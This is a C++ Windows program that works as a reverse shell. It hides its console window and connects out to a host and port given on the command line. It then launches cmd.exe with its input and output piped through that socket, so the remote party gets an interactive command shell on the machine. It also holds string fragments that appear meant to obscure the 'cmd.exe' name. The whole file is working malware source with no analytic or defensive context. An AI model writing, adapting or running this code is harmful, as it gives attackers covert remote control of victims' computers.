#include <winsock2.h>
#include <stdio.h>
#include <string>
#include<iostream>
#include <Lmcons.h>

#pragma comment(lib,"ws2_32") 
#pragma warning(disable:4996) 

std::string getFileName(const std::string& s) {

	char sep = '/';

#ifdef _WIN32
	sep = '\\';
#endif
	size_t i = s.rfind(sep, s.length());
	if (i != std::string::npos) {
		return(s.substr(i + 1, s.length() - i));
	}

	return("");
}

std::string getFilePath() {
	TCHAR username[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);

	std::string strtmp(&username[0], &username[(int)size - 1]);

	std::string path = "C:\\Users\\" + strtmp + "\\Downloads\\";

	return path;
}

int main(int argc, char* argv[]) {
	WSADATA wsaData; 
	SOCKET connected;
	struct sockaddr_in result;
	STARTUPINFOA startup;
	PROCESS_INFORMATION process;
	int iResult;

	if (argc != 3) {
		std::cout << "usage: " << argv[0] << " server - name, port number" << std::endl;
		return 1;
	}
	FreeConsole(); //Hide window
	iResult= WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		std::cout << "WSAStartup failed with error: " << iResult << std::endl;
		return 1;
	}
	std::string path = getFilePath();
	//path.resize(path.size() - 4); //remove .exe from the file
	connected = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	if (connected == INVALID_SOCKET) {
		std::cout << "socket failed with error: " << WSAGetLastError() << std::endl;
		WSACleanup();
		return 1;
	}
	result.sin_family = AF_INET;
	result.sin_port = htons(atoi(argv[2]));
	result.sin_addr.s_addr = inet_addr(argv[1]);
	iResult = WSAConnect(connected, (SOCKADDR*)&result, sizeof(result), 0, 0, 0, 0);
	if (iResult == SOCKET_ERROR) {
		closesocket(connected);
		connected = INVALID_SOCKET;
	}
	memset(&startup, 0, sizeof(startup));
	startup.cb = sizeof(startup);
	startup.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	startup.hStdInput = startup.hStdOutput = startup.hStdError = (HANDLE)connected;
	TCHAR cm[256] = L"cm";
	TCHAR d[256] = L"d.exe";
	//strcat((char*)cm, (char*)d)
	CreateProcessA(NULL, (LPSTR)"cmd.exe", 0, 0, 1, 0, 0, 0, &startup, &process);
//	WaitForSingleObject(process.hProcess, INFINITE);
//	CloseHandle(process.hProcess);
//	CloseHandle(process.hThread);
	return 0;
}